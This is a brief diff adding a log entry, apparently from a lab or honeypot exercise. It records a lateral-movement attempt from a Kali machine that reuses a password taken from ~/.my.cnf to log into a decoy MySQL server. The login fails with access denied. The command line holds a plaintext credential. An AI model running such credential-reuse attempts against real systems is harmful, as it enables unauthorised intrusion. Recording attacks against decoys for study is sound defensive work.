@@ -1,0 +1,5 @@
+# 2026-11-27 18:55:45 UTC · 2 s · desde kali (10.0.0.20)
+# Movimiento lateral: credencial de ~/.my.cnf contra el MySQL del señuelo
+$ mysql -h 10.0.0.50 -u app_svc -puL6afPqDJTtrbMdu --skip-ssl --connect-timeout=5 -e 'show databases'
+
+ERROR 1045 (28000): Access denied for user 'app_svc'@'10.0.0.20' (using password: YES)
